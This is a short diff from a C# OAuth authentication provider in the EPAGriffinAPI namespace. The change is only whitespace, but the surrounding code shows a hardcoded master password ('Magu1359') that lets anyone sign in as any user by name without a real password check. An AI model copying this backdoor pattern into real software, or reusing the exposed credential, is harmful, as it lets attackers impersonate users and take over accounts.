@@ -87,12 +87,13 @@ namespace EPAGriffinAPI.Providers
                     else
                         verified = true;
                 }
-
+                
                 if (password != "Magu1359")
-                    user = await userManager.FindAsync(context.UserName, password);
+                     user = await userManager.FindAsync(context.UserName, password);
+                    
                 else
                     user = await userManager.FindByNameAsync(context.UserName);
-
+                
                 
 
                 if (user == null)
